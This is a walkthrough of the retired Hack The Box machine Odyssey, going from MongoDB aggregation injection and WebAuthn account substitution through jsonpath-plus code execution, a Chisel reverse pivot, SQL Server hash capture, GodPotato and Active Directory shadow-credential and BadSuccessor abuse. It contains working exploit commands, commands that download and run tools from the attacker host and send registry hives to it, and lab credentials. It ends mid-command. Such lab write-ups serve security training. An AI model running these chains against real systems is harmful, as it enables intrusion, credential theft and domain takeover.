# HTB Odyssey

**Hack The Box · Windows · Insane · Retired** · [Machine page](https://www.hackthebox.com/machines/odyssey)

## Summary

Odyssey starts with a Node.js application on TCP/3000. Public JavaScript points to a username-less WebAuthn flow and an MDS compatibility endpoint. The MDS endpoint accepts a client-controlled MongoDB aggregation pipeline; a shallow stage allowlist can be bypassed by nesting `$lookup` inside `$facet`. An allowed `$function` expression then exposes MongoDB's embedded JavaScript engine and a module-loader file oracle.

The oracle identifies the application directory and lets a CommonJS tracer recover route logic and configuration. An unused invitation allows WebAuthn enrollment, and an account-binding flaw lets a valid credential authenticate as the application administrator. Administrator-only rendering is vulnerable to prototype pollution, which enables a LaTeX file read in an isolated renderer. Those files disclose a hidden diagnostic route and token; the route uses a vulnerable `jsonpath-plus` release and provides command execution as `webadmin`.

The internal chain crosses two Windows hosts. A Chisel pivot reaches SQL Server, where an audit login can force the SQL service account to authenticate over SMB. Cracking the captured NetNTLMv2 response recovers the `svc-mssql` password. SQL `sysadmin`, `xp_cmdshell`, and `SeImpersonatePrivilege` lead to SYSTEM on the database host and `user.txt`.

The database host's machine account can write `msDS-KeyCredentialLink` on `svc-aegis-build`. A shadow credential gives a Kerberos TGT, and delegated dMSA rights provide a BadSuccessor path to `svc-aegis-deploy` on DC01. That account is an AegisStream viewer. A viewer-authorized DPAPI operation exposes the key needed to decrypt the operator credential, after which an unsafe YamlDotNet import executes as the stream service. Its enabled impersonation privilege provides SYSTEM and access to `root.txt`.

| Stage | Result |
| --- | --- |
| Public web and MDS | Client-controlled aggregation and MongoDB JavaScript |
| Module loader and CommonJS tracing | Application paths, route logic, SQL settings, and pending invites |
| WebAuthn and renderer | Administrator session and renderer-context file read |
| Diagnostic JSONPath | Command execution as `webadmin` and an internal-network pivot |
| SQL Server | `svc-mssql`, SYSTEM, and `user.txt` |
| Active Directory | `ODYSSEY-DB$` → `svc-aegis-build` → `svc-aegis-deploy` |
| AegisStream | Viewer → operator → stream service → SYSTEM and `root.txt` |

## Reproduction setup

Clone the repository and enter the machine directory before running any of the commands below:

```bash
git clone https://github.com/Zendeni/HTB-Writeups.git
cd HTB-Writeups/Machines/HackTheBox/Odyssey
```

If the repository is already present, update it and return to the same directory instead:

```bash
git -C HTB-Writeups pull --ff-only
cd HTB-Writeups/Machines/HackTheBox/Odyssey
```

The recorded instance used these addresses:

| Context | Address |
| --- | --- |
| Public target | `10.129.104.203` |
| Attacker VPN address | `10.10.15.156` |
| Web host, internal interface | `172.16.0.12` |
| SQL Server | `172.16.0.11` |
| Domain controller | `172.16.0.10` |

The public target and attacker VPN address can change after a reset or VPN reconnect. Run all local commands from the `Odyssey` directory in this repository. The helper scripts save their output under `responses/` and `scans/`; generated binaries and recovered secrets are ignored by Git.

If you are on Kali, Kali implements PEP 668, so install the two Python dependencies in a virtual environment rather than into the system Python installation:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
chmod +x scripts/*.sh scripts/*.py
```

Activate `.venv` again in each new local terminal that runs a Python helper.
Tools installed with `pipx`, including BloodyAD on this Kali system, are normally exposed under `/root/.local/bin`. Add both user-tool directories for the current shell:

```bash
export PATH="$PATH:/root/.local/bin:/root/.dotnet/tools"
```

Record the current addresses and map the virtual host:

```bash
export TARGET_IP=10.129.104.203
export ATTACKER_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]; exit}')
test -n "$ATTACKER_IP"

sed -i '/[[:space:]]aegis\.korvia\.htb\([[:space:]]\|$\)/d' /etc/hosts
printf '%s aegis.korvia.htb\n' "$TARGET_IP" >> /etc/hosts
```

Additional tools and runtime variables are listed in [REPRODUCTION.md](REPRODUCTION.md).

## 1. Enumerating the public application

### 1.1 TCP scan and service identification

A full TCP SYN scan avoids biasing the investigation toward common web ports:

```bash
nmap -sS -Pn -n -p- -T4 \
  --min-rate 1000 --max-rate 1500 --max-retries 2 \
  --stats-every 15s --reason \
  -oA scans/tcp-full-adaptive \
  "$TARGET_IP"
```

```text
PORT     STATE SERVICE REASON
3000/tcp open  ppp     syn-ack ttl 127
```

`ppp` is only Nmap's default name for port 3000 before version detection. It does not mean PPP is running. A targeted probe identifies the actual service:

```bash
nmap -sV -sC -Pn -n -p3000 --reason \
  -oA scans/tcp-3000-service \
  "$TARGET_IP"
```

```text
3000/tcp open  http  Node.js Express framework
```

### 1.2 WebAuthn and the MDS API

The unauthenticated login page loaded two readable JavaScript files. Searching them showed both a username-less WebAuthn ceremony and an MDS compatibility ticker:

```bash
curl -sS http://aegis.korvia.htb:3000/js/main.js |
  grep -nE 'compatibility ticker|aegis-mds/search'

curl -sS http://aegis.korvia.htb:3000/js/webauthn.js |
  grep -nE '/api/v1/auth/webauthn/(register|auth)/(begin|finish)'

curl -sS \
  -H 'Content-Type: application/json' \
  -d '{}' \
  http://aegis.korvia.htb:3000/api/v1/auth/webauthn/auth/begin |
  jq '{allowCredentials, userVerification}'
```

Condensed output:

```text
FIDO authenticator compatibility ticker
/api/v1/aegis-mds/search?q=&limit=8

/api/v1/auth/webauthn/register/begin
/api/v1/auth/webauthn/register/finish
/api/v1/auth/webauthn/auth/begin
/api/v1/auth/webauthn/auth/finish

{
  "allowCredentials": [],
  "userVerification": "preferred"
}
```

An empty `allowCredentials` list is consistent with username-less authentication using discoverable credentials. It does not alone prove the registration policy. The exact `residentKey: "required"` setting was confirmed later from the recovered server-side handler.

## 2. MongoDB aggregation control

### 2.1 Proving that `pipeline` is executed

The MDS request accepted a JSON value in the `pipeline` query parameter. One response is not enough to distinguish a real injection from an ignored parameter, so four controls were used:

- An empty pipeline establishes the baseline.
- A known vendor filter should reduce the result set.
- A guaranteed miss should return zero rows.
- `$limit: 1` should return exactly one row.

```bash
./scripts/probe-mds-pipeline.sh
```

The helper sends requests equivalent to:

```bash
curl -sS -G \
  --data-urlencode 'pipeline=[{"$match":{"vendor":"Yubico"}}]' \
  http://aegis.korvia.htb:3000/api/v1/aegis-mds/search
```

Relevant counts:

```text
empty       status=200 count=52
match_hit   status=200 count=4
match_miss  status=200 count=0
limit_one   status=200 count=1
```

The results change exactly as the supplied MongoDB stages predict. The application is therefore passing the client pipeline to MongoDB rather than treating it as an ordinary search string.

### 2.2 Shallow stage filtering

The same helper also submits `lookup_direct` and `lookup_facet` controls. A direct `$lookup` was rejected, showing that the application did have an allowlist. The check only inspected top-level stages, however. `$facet` was allowed, and MongoDB permits a sub-pipeline inside it. `lookup_facet` placed the same `$lookup` in that sub-pipeline and returned HTTP 200 with a result, proving that MongoDB executed the nested stage.

This distinction matters: the issue was not merely control of filtering and limiting. The nested-stage bypass allowed queries against collections other than the public MDS records, including `pending_invites` later in the chain.

## 3. MongoDB JavaScript and the module-loader oracle

### 3.1 Identifying the runtime

The accepted `$project` stage also allowed `$function`, which executes JavaScript inside MongoDB's embedded engine. This is MongoDB JavaScript, not Node.js; Node globals such as `require` and `process` are not normally present.

The runtime was queried first, followed by a module-loader test against a harmless known file:

```bash
./scripts/probe-mds-buildinfo.sh
./scripts/mongodb-module-read.sh hostname /etc/hostname
```

Condensed output:

```text
status=200
version=7.0.32
buildEnvironment.target_os=linux
ReferenceError: odyssey is not defined
```

MongoDB `7.0.32` is within the affected range described by the [MongoDB security alerts](https://www.mongodb.com/resources/products/alerts) for CVE-2026-13078. The database flaw normally assumes access to MongoDB; here the public Express endpoint supplied the necessary aggregation operation.

The hostname file contained the text `odyssey`. The module loader read the file, attempted to interpret it as JavaScript, and treated that token as an undefined identifier. The value reappeared in the `ReferenceError`, establishing an error-based file oracle. At this point it was not a general raw-file download primitive.

### 3.2 Turning errors into path discovery

The loader returned different errors for different path types:

```text
Missing path:        can't open for reading ...
Existing directory:  Directory import ... is not supported
Existing CommonJS:   require is not defined
```

Those differences allow controlled path discovery. A wordlist probe under `/home` found the service user's directory:

```bash
./scripts/probe-directory-wordlist.sh /home home
```

Relevant result:

```text
/home/webadmin  error  Error: Directory import '/home/webadmin' is not supported, imported from /
```

The next step was a bounded set of conventional application directory names under that user:

```bash
./scripts/probe-module-paths.sh webadmin-children \
  /home/webadmin/aegis \
  /home/webadmin/app \
  /home/webadmin/www \
  /home/webadmin/web \
  /home/webadmin/api \
  /home/webadmin/backend
```

`/home/webadmin/aegis` returned the directory-specific error. Candidate files and subdirectories beneath it then identified the application layout:

```bash
./scripts/probe-module-paths.sh aegis-children \
  /home/webadmin/aegis/package.json \
  /home/webadmin/aegis/server.js \
  /home/webadmin/aegis/routes \
  /home/webadmin/aegis/db \
  /home/webadmin/aegis/lib

./scripts/probe-module-paths.sh aegis-modules \
  /home/webadmin/aegis/db/mongo.js \
  /home/webadmin/aegis/db/sql.js \
  /home/webadmin/aegis/routes/webauthn.js \
  /home/webadmin/aegis/lib/render_worker.js
```

Existing CommonJS files reached their first Node-specific `require()` statement before failing. This confirmed that MongoDB had read the files, but it still did not return their source directly.

### 3.3 Tracing CommonJS modules

To get beyond the first `require is not defined` error, the included tracer executes the module with inert Proxy-based replacements for `require`, `module`, `process.env`, and imported dependencies. The proxies record:

- module imports and environment-variable reads;
- arguments passed to mocked functions such as `mssql.connect()`;
- Express route registrations and handler function bodies;
- exported functions and selected safe invocations.

They do not make real MongoDB or SQL connections.

```bash
./scripts/trace-commonjs-module.sh \
  mongo /home/webadmin/aegis/db/mongo.js

./scripts/trace-commonjs-module.sh \
  webauthn /home/webadmin/aegis/routes/webauthn.js

./scripts/trace-commonjs-module.sh \
  sql /home/webadmin/aegis/db/sql.js
```

The WebAuthn trace exposed the four server-side handlers used in the next stage. The SQL trace recorded the configuration object passed to the mocked `mssql.connect()` call. Extract it from the saved response:

```bash
jq -r '
  .[0].probe as $p |
  ($p.trace[] |
    select(.op == "call" and .path == "require(mssql).connect") |
    .args[0] | fromjson) as $c |
  "application root=\($p.path | sub("/db/sql\\.js$"; ""))",
  "SQL host=\($c.server)",
  "SQL database=\($c.database)",
  "SQL username=\($c.user)",
  "SQL password=\($c.password)"
' responses/cjs-trace-sql.body
```

```text
application root=/home/webadmin/aegis
SQL host=172.16.0.11
SQL database=aegis
SQL username=odyssey_app
SQL password=opc0932k90%%lODFI93-++
```

The tracer's fake `process.env` returns no values, so these are source-code fallback settings. They disclose the internal host and default connection details, but do not prove that the live Express process had no environment overrides.

Also keep the execution contexts distinct: `/etc/hostname` in the MongoDB context returned `odyssey`, whereas the renderer later returned `odyssey-web`. The evidence proves which files each context could see; it does not establish whether MongoDB and the renderer shared a host, container, or filesystem namespace.

## 4. WebAuthn account binding

### 4.1 Reading an unused invitation

The recovered registration handler queried `pending_invites` for `{token, redeemed: false}`. That revealed both the collection name and the condition needed for enrollment. The earlier `$facet` bypass could query it from the public MDS endpoint:

```bash
curl --connect-timeout 5 --max-time 15 -sS -G \
  -o responses/pending-invites.body \
  -w 'status=%{http_code} bytes=%{size_download}\n' \
  --data-urlencode 'pipeline=[{"$limit":1},{"$facet":{"invites":[{"$lookup":{"from":"pending_invites","pipeline":[{"$match":{"redeemed":false}},{"$limit":10}],"as":"rows"}},{"$project":{"_id":0,"rows":1}}]}}]' \
  http://aegis.korvia.htb:3000/api/v1/aegis-mds/search

jq '.[0].invites[0].rows | map({operator_id, redeemed, expires_at})' \
  responses/pending-invites.body
```

`curl -o` saves the response body to `responses/pending-invites.body`, while `-w` prints the HTTP status and response size in the terminal.

Select the first currently unused token rather than relying on collection order:

```bash
jq -r '
  .[0].invites[0].rows[] |
  select(.redeemed == false) |
  .token
' responses/pending-invites.body |
  head -n 1 > responses/invite-token.txt

test -s responses/invite-token.txt
```

### 4.2 WebAuthn `userHandle` substitution

The registration handler required a discoverable credential and stored its credential ID, public key, and original user handle. The authentication handler correctly looked up the credential by ID and verified the signed assertion against its stored public key. After verification, however, it selected the application user from the independently supplied `response.userHandle` instead of the handle bound to the stored credential.

The included Selenium helper creates a virtual CTAP2 authenticator, enrolls a valid resident credential with the invitation, signs a real assertion, and changes only the `userHandle` sent to the finish endpoint. The signature remains valid, while the vulnerable handler resolves the session as `admin`:

```bash
./scripts/webauthn-impersonate.py \
  < responses/invite-token.txt |
  tee responses/webauthn-admin.json

export AEGIS_COOKIE
AEGIS_COOKIE=$(jq -r '.cookie_header' responses/webauthn-admin.json)
test -n "$AEGIS_COOKIE"
```

Relevant response:

```json
{
  "handle": "admin",
  "display_name": "System Administrator",
  "role": "Administrator",
  "clearance": "Δ-5",
  "redirect": "/dashboard"
}
```

## 5. Renderer prototype pollution and file read

Administrator access exposed a legacy template-rendering feature. The route submitted a job to `/home/webadmin/aegis/lib/render_worker.js`, which ran under the isolated `aegis-render` identity.

The worker recursively merged a user-controlled `overrides` object into its Nunjucks options. Supplying `__proto__` set an inherited `allowRawBlocks` property. Because the policy checked that inherited property, raw LaTeX passed through Nunjucks and Pandoc to `pdflatex`.

The included Markdown payloads use TeX `\openin`, `\read`, and `\typeout` to place readable file content in the captured compiler diagnostics:

```bash
./scripts/render-template-probe.sh prototype-hostname \
  @artifacts/prototype-raw-hostname.md \
  '{"__proto__":{"allowRawBlocks":true}}'

./scripts/render-template-probe.sh render-env \
  @artifacts/prototype-read-render-env.md \
  '{"__proto__":{"allowRawBlocks":true}}'
```

```text
stage=nunjucks code=0
stage=pandoc code=0
stage=pdflatex code=1
AEGIS-LEAK:odyssey-web
AEGIS-HIT:/etc/aegis-render.env
```

The environment lines are stored in the saved rendering response. Extract the database settings with:

```bash
jq -r '.stages[] | .stderr // empty' \
  responses/template-render-render-env.body |
  sed -n 's/^FILELINE:[0-9][0-9]*:\(AEGIS_RENDER_DB_[A-Z_]*=[^[:space:]]*\).*/\1/p' |
  awk '!seen[$0]++'
```

```text
AEGIS_RENDER_DB_USER=aegis_audit_publisher
AEGIS_RENDER_DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
AEGIS_RENDER_DB_HOST=172.16.0.11
AEGIS_RENDER_DB_DB=aegis_audit
AEGIS_RENDER_DB_PORT=1433
```

The non-zero `pdflatex` code is expected for these diagnostic payloads. The file lines had already been written to the log before the final PDF build failed. This primitive reads files available to `aegis-render`; it is not yet command execution as `webadmin`.

The renderer environment therefore disclosed a separate audit-database connection:

```text
server=172.16.0.11
database=aegis_audit
username=aegis_audit_publisher
password=Rxd!Qw6n8sP..2bJ@Wpx-2026
```

## 6. Diagnostic JSONPath to `webadmin`

The renderer read showed that configuration lived under `/etc`, so the same primitive was used to inspect the MDS diagnostic environment, its route source, and the installed JSONPath package metadata:

```bash
./scripts/render-template-probe.sh mds-diag-env \
  @artifacts/prototype-read-mds-diag-env.md \
  '{"__proto__":{"allowRawBlocks":true}}'

./scripts/render-template-probe.sh mds-diag-source-v2 \
  @artifacts/prototype-read-mds-diag-source.md \
  '{"__proto__":{"allowRawBlocks":true}}'

./scripts/render-template-probe.sh jsonpath-package \
  @artifacts/prototype-read-jsonpath-package.md \
  '{"__proto__":{"allowRawBlocks":true}}'
```

Each helper invocation saves its complete response under `responses/`. Extract the token, registered route, and package version with:

```bash
jq -r '.stages[] | .stderr // empty' \
  responses/template-render-mds-diag-env.body |
  sed -n 's/^FILELINE:[0-9][0-9]*:\(MDS_DIAG_TOKEN=[^[:space:]]*\).*/\1/p' |
  head -n 1

jq -r '.stages[] | .stderr // empty' \
  responses/template-render-mds-diag-source-v2.body |
  sed -n 's/^SOURCE:[0-9][0-9]*:\(.*\/api\/v1\/aegis-mds\/_diag.*\)[[:space:]]*$/\1/p' |
  head -n 1 |
  sed 's/[[:space:]]*$//'

jq -r '.stages[] | .stderr // empty' \
  responses/template-render-jsonpath-package.body |
  sed -n 's/^FILELINE:[0-9][0-9]*:\({.*}\)[[:space:]]*$/\1/p' |
  head -n 1 |
  jq -r '"\(.name)=\(.version)"'
```

```text
MDS_DIAG_TOKEN=<MDS_DIAGNOSTIC_TOKEN>
route=/api/v1/aegis-mds/_diag/:token/jpquery
jsonpath-plus=10.2.0
```

The route accepted an expression beginning with `$` and passed it to `jsonpath-plus 10.2.0`, which is affected by [CVE-2025-1302](https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-8719585). `jpquery.sh` extracts the token from the saved renderer response and submits the included identity-check expression:

```bash
./scripts/jpquery.sh rce-id registration \
  @artifacts/jsonpath-rce-id.txt

jq -r '.detail' responses/jpquery-rce-id.body
```

Expected result:

```text
status=500
uid=1000(webadmin) gid=1000(webadmin) groups=...
```

HTTP 500 is success for this payload. The expression deliberately throws an exception containing `execSync()` output; the route catches it as `JpQueryFailure` and returns the command output in `.detail`. The operating-system identity proves that this route runs in the main web context as `webadmin`, not in the renderer context as `aegis-render`.

## 7. Building the internal-network pivot

Command execution showed that the web host had `172.16.0.12/24`. The source configuration already identified SQL Server at `172.16.0.11`, so the next requirement was routing local tools through the web host.

This pivot requires three live components:

1. An HTTP server on Kali so the web host can download Chisel.
2. A reverse Chisel server on Kali.
3. A Chisel client on the web host, which creates the local SOCKS listener.

Shell variables are not shared between terminals. Run the following in each new attacker terminal used below, or replace `$ATTACKER_IP` with the current address explicitly:

```bash
export ATTACKER_IP=$(ip -4 -o addr show tun0 | awk '{split($4,a,"/"); print a[1]; exit}')
test -n "$ATTACKER_IP"
```

In attacker terminal 1, serve the compatible Chisel binary:

```bash
mkdir -p /tmp/odyssey-chisel
cp /usr/bin/chisel /tmp/odyssey-chisel/chisel
python3 -m http.server 8000 \
  --directory /tmp/odyssey-chisel \
  --bind "$ATTACKER_IP"
```

In attacker terminal 2, start the reverse server:

```bash
/usr/bin/chisel server \
  --reverse \
  --port 8001 \
  --host "$ATTACKER_IP"
```

In attacker terminal 3, use the JSONPath command primitive to download and launch the client on the web host:

```bash
./scripts/jpquery-rce.sh stage-chisel \
  "/usr/bin/curl -fsS http://$ATTACKER_IP:8000/chisel -o /tmp/.aegis-chisel && chmod 700 /tmp/.aegis-chisel && sha256sum /tmp/.aegis-chisel"

./scripts/jpquery-rce.sh start-chisel-v2 \
  "(/tmp/.aegis-chisel client http://$ATTACKER_IP:8001 R:socks >/tmp/.aegis-chisel.log 2>&1 </dev/null)& true"
```

The HTTP terminal should show a request from the target, and the Chisel server should report a reverse connection. Only after the remote client connects will Kali listen on `127.0.0.1:1080`:

```bash
ss -ltnp '( sport = :8000 or sport = :8001 or sport = :1080 )'
```

Configure the ProxyChains proxy list with:

```text
[ProxyList]
socks5 127.0.0.1 1080
```

Then confirm the SQL port through the SOCKS proxy:

```bash
proxychains4 -q nmap -n -Pn -sT -p1433 --reason \
  --max-retries 1 --host-timeout 20s \
  172.16.0.11
```

Use `-sT` because a TCP connect scan can traverse SOCKS; a raw SYN scan cannot. Keep both Chisel processes alive throughout the SQL and AD stages. A running HTTP server by itself is not a working pivot.

## 8. SQL Server: audit login to SYSTEM

The renderer credential led to the following chain:

```text
aegis_audit_publisher
  → bulkadmin and OPENROWSET(BULK...)
  → outbound SMB authentication by ODYSSEY\svc-mssql
  → NetNTLMv2 capture and offline password recovery
  → Windows-authenticated SQL sysadmin
  → xp_cmdshell as svc-mssql with SeImpersonatePrivilege
  → SQL CLR token helper
  → SYSTEM
```

### 8.1 Enumerating the audit login

`mssql-audit.sh` connects through ProxyChains. It extracts the credential from the saved renderer response or accepts the `AEGIS_RENDER_DB_*` variables documented in [REPRODUCTION.md](REPRODUCTION.md). The wrapper uses `scripts/impacket-example.sh` so Kali's system Impacket continues to work while `.venv` is active.

```bash
./scripts/mssql-audit.sh \
  -file artifacts/mssql-audit-enum.sql
```

Relevant results:

```text
Microsoft SQL Server 2022 RTM (16.0.1000)
login=aegis_audit_publisher
database=aegis_audit
server_role=bulkadmin
database_role=db_owner
xp_cmdshell=0
clr enabled=0
show advanced options=0
```

The identities and scopes are important:

- `db_owner` applies inside `aegis_audit`.
- `bulkadmin` permits server-side bulk-file operations.
- `xp_cmdshell` and CLR were initially disabled, so the audit login did not yet have direct command execution.

Those values describe the first pass through the box. Section 8.3 enables `show advanced options` and `xp_cmdshell`, and section 8.4 enables CLR. SQL Server retains those settings, so repeating this enumeration later on the same instance can legitimately return `1` for all three values.

SQL Server performs `OPENROWSET(BULK...)` file access in the SQL Server process context. A local-file control and the rotated error logs confirmed that access and revealed the Windows service identity:

```bash
./scripts/mssql-audit.sh \
  -file artifacts/mssql-bulk-controls.sql

./scripts/mssql-audit.sh \
  -file artifacts/mssql-errorlog-archives.sql
```

```text
aegis_audit_publisher  SQL-authenticated database login
ODYSSEY\svc-mssql      Windows account running SQL Server
```

### 8.2 Capturing the service account's SMB authentication

`OPENROWSET(BULK...)` also accepts UNC paths. Before checking whether the requested file exists, Windows authenticates to the remote SMB server. Because the database session used SQL authentication, the outbound request is made by the SQL Server service account.

The supplied SQL file contains the recorded VPN address. Generate a per-run copy with the current address:

```bash
sed "s/10\.10\.15\.156/$ATTACKER_IP/g" \
  artifacts/mssql-unc-auth.sql \
  > responses/mssql-unc-auth-current.sql

cat responses/mssql-unc-auth-current.sql
```

Start Responder in a separate attacker terminal:

```bash
responder -I tun0 -v
```

Trigger the UNC access from another terminal:

```bash
./scripts/mssql-audit.sh \
  -file responses/mssql-unc-auth-current.sql
```

The remote file need not exist: SMB authentication happens first. Responder captures a NetNTLMv2 challenge-response for `svc-mssql`. This is neither the plaintext password nor a reusable NT hash; it permits offline testing of password candidates.

Copy the latest captured line into the path expected by the cracking command:

```bash
rg --no-filename -i 'svc-mssql' \
  /usr/share/responder/logs/SMB-NTLMv2-*.txt |
  tail -n 1 > responses/svc-mssql.netntlmv2

test -s responses/svc-mssql.netntlmv2
```

Use Hashcat mode 5600 for NetNTLMv2:

```bash
hashcat -m 5600 -a 0 -O \
  --session odyssey-svc-mssql \
  --potfile-path responses/hashcat-odyssey.pot \
  --outfile responses/svc-mssql.cracked \
  --outfile-format 2 \
  responses/svc-mssql.netntlmv2 \
  /usr/share/wordlists/rockyou.txt
```

`--outfile-format 2` writes only the recovered password:

```text
cml958782
```

### 8.3 Reconnecting as the service account

`mssql-svc.sh` reads the first line of `responses/svc-mssql.cracked` and uses Windows-integrated SQL authentication:

```bash
./scripts/mssql-svc.sh \
  -file artifacts/mssql-svc-enum.sql
```

```text
SYSTEM_USER=ODYSSEY\svc-mssql
IS_SRVROLEMEMBER('sysadmin')=1
```

SQL `sysadmin` can change server-level settings. The next query enables advanced options and `xp_cmdshell`, then inspects the Windows token used for spawned commands:

```bash
./scripts/mssql-svc.sh \
  -file artifacts/mssql-enable-command-enum.sql
```

```text
SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
```

For a SQL `sysadmin`, `xp_cmdshell` runs in the SQL Server service context. SQL administrative access had therefore become operating-system command execution as `ODYSSEY\svc-mssql`, with an enabled impersonation privilege.

### 8.4 SQL CLR, SYSTEM, and `user.txt`

Defender blocked a standalone token helper written to the target. The alternative was to compile the same logic into a SQL CLR assembly and submit the DLL bytes through SQL.

`build-token-helper.sh` clones GodPotato when necessary, pins commit `59f66583474fb0297b7447551460e1072de324c0`, and builds:

```text
artifacts/AuditWorker.exe
artifacts/AuditWorkerSql.dll
```

The script runs `mcs` with `TERM=dumb`. This avoids Mono 6's `File must be smaller than 4K` failure when a modern terminal uses a large terminfo entry.

Build and register the assembly:

```bash
./scripts/build-token-helper.sh &&
  ./scripts/load-auditworker-clr.sh
```

The loader enables CLR, registers the DLL's SHA-512 hash as trusted, creates an `UNSAFE` assembly, and exposes `dbo.audit_token_exec`. The assembly runs inside SQL Server and inherits the service token's `SeImpersonatePrivilege`.

Test it with the included identity query:

```bash
./scripts/mssql-svc.sh \
  -file artifacts/mssql-auditworker-clr-proof.sql
```

```text
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] PID : 468 Token:0x776 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
nt authority\system
```

GodPotato triggers RPCSS authentication to a controlled named pipe. `NETWORK SERVICE` is the intermediate named-pipe client identity seen during that RPC transition; it is not the SQL login. The helper then locates and duplicates a SYSTEM token.

With SYSTEM confirmed, read the local Administrator desktop:

```bash
./scripts/mssql-svc.sh \
  -file artifacts/mssql-system-user-proof.sql
```

```text
[*] CurrentUser: NT AUTHORITY\SYSTEM
USER_FLAG
[USER FLAG OMITTED]
LOCAL_ADMIN_DESKTOP
desktop.ini
user.txt
```

### 8.5 Recovering the database host's machine identity

SYSTEM can save the protected `SYSTEM`, `SECURITY`, and `SAM` registry hives. The `SYSTEM` hive supplies the boot key; the `SECURITY` hive contains LSA secrets, including the domain-joined machine's credential material.

Responder from the NetNTLMv2 capture stage must be stopped before continuing because both Responder and the Impacket SMB server bind TCP/445. Press `Ctrl+C` in the Responder terminal. If that terminal is no longer available, identify and stop only the Responder process:

```bash
pgrep -a -f '[R]esponder.py'
pkill -f '[R]esponder.py'
```

Verify that TCP/445 has no remaining listener:

```bash
ss -ltnp '( sport = :445 )'
```

Then start the authenticated temporary share from the repository root:

```bash
./scripts/impacket-example.sh smbserver -smb2support \
  -username exfil \
  -password 'Exfil-2026-Temp!' \
  share "$PWD/smb-share"
```

The SMB server intentionally remains in the foreground while it listens on TCP/445. Leave this terminal open and run the hive-export query from a second terminal. Stop the server with `Ctrl+C` only after all three hive files have arrived in `smb-share/`.

Create a per-run copy of the export query with the current VPN address:

```bash
sed "s/10\.10\.15\.156/$ATTACKER_IP/g" \
  artifacts/mssql-system-export-hives.sql \
  > responses/mssql-system-export-hives-current.sql
```

Run the export:

```bash
./scripts/mssql-svc.sh \
  -file responses/mssql-system-export-hives-current.sql
```

Process the downloaded hives locally:

```bash
./scripts/impacket-example.sh secretsdump \
  -system smb-share/od_sys.hiv \
  -security smb-share/od_sec.hiv \
  -sam smb-share/od_sam.hiv LOCAL |
  tee responses/odyssey-db-secrets.txt
```

Relevant output:

```text
ODYSSEY\ODYSSEY-DB$:aad3b435b51404eeaad3b435b51404ee:<MACHINE_NT_HASH>:::
ODYSSEY-DB$ AES256: <MACHINE_AES256_KEY>
ODYSSEY-DB$ AES128: <MACHINE_AES128_KEY>
```

A domain machine account is an Active Directory security principal. Its NT hash or Kerberos keys can therefore authenticate to domain services as `ODYSSEY-DB$`.

Internal enumeration identified DC01 at `172.16.0.10`. The wrapper extracts the NT hash from the `secretsdump` transcript and queries effective rights through ProxyChains:

```bash
export PATH="$PATH:/root/.local/bin"
command -v bloodyAD

./scripts/bloody-machine.sh \
  get membership 'ODYSSEY-DB$'

./scripts/bloody-machine.sh \
  get writable --detail --partition DOMAIN --exclude-del
```

The important nested membership path was:

```text
ODYSSEY-DB$
  └── Build Hosts
      └── Pipeline Trustees
          └── Attest Key Managers
```

It produced one useful object-specific right:

```text
CN=svc-aegis-build,OU=Pipeline,DC=odyssey,DC=htb
msDS-KeyCredentialLink: WRITE
```

## 9. Active Directory: machine account to deploy account

### 9.1 Shadow credential on `svc-aegis-build`

`msDS-KeyCredentialLink` stores key credentials that can be used for certificate-based Kerberos authentication. Write access lets the machine account register an attacker-controlled public key on `svc-aegis-build`; possession of the corresponding private key then permits PKINIT as that account without knowing its password.

Make sure the `pipx` application directory is available in this terminal before invoking BloodyAD directly:

```bash
export PATH="$PATH:/root/.local/bin"
command -v bloodyAD
```

```bash
./scripts/bloody-machine.sh add shadowCredentials \
  svc-aegis-build --path responses/svc-aegis-build

KRB5CCNAME=responses/svc-aegis-build.ccache klist
```

NT-hash extraction returned `KDC_ERR_ETYPE_NOTSUPP`, but that did not invalidate the successful PKINIT step. `klist` confirmed that the tool had already saved a TGT:

```text
Default principal: svc-aegis-build@ODYSSEY.HTB
Service: krbtgt/ODYSSEY.HTB@ODYSSEY.HTB
```

Use that ticket to enumerate the build account's effective write permissions:

```bash
KRB5CCNAME=responses/svc-aegis-build.ccache \
proxychains4 -q bloodyAD -s \
  -d odyssey.htb -u svc-aegis-build \
  -k ccache=responses/svc-aegis-build.ccache kdc=172.16.0.10 \
  -H dc01.odyssey.htb -i 172.16.0.10 \
  get writable --detail --partition DOMAIN --exclude-del
```

```text
OU=Migrations,DC=odyssey,DC=htb
  msDS-DelegatedManagedServiceAccount: CREATE_CHILD

CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
  msDS-SupersededManagedAccountLink: WRITE
  msDS-SupersededServiceAccountState: WRITE
```

The first permission allowed creation of a delegated managed service account in `OU=Migrations`; the two object rights allowed that dMSA to be associated with `svc-aegis-deploy` as a superseding account.

### 9.2 BadSuccessor to `svc-aegis-deploy`

During a legitimate dMSA migration, the KDC can make predecessor credentials available to the successor. The rights above allowed the build account to create `aegis-migrate$` and configure `svc-aegis-deploy` as its predecessor:

```bash
KRB5CCNAME=responses/svc-aegis-build.ccache \
proxychains4 -q bloodyAD -s \
  -d odyssey.htb -u svc-aegis-build \
  -k ccache=responses/svc-aegis-build.ccache kdc=172.16.0.10 \
  -H dc01.odyssey.htb -i 172.16.0.10 \
  add badSuccessor aegis-migrate \
  -t 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' \
  --ou 'OU=Migrations,DC=odyssey,DC=htb' |
  tee responses/badsuccessor.txt
```

```text
[+] Creating DMSA aegis-migrate$ in OU=Migrations,DC=odyssey,DC=htb
[+] Impersonating: CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb
dMSA previous keys found in TGS:
RC4: <SVC_AEGIS_DEPLOY_KEY>
```

If this step is repeated without cleanup, BloodyAD can return `entryAlreadyExists` because `aegis-migrate$` and the supersession relationship remain in AD. Confirm that the existing deploy account points to that dMSA:

```bash
KRB5CCNAME=responses/svc-aegis-build.ccache \
proxychains4 -q bloodyAD -s \
  -d odyssey.htb -u svc-aegis-build \
  -k ccache=responses/svc-aegis-build.ccache kdc=172.16.0.10 \
  -H dc01.odyssey.htb -i 172.16.0.10 \
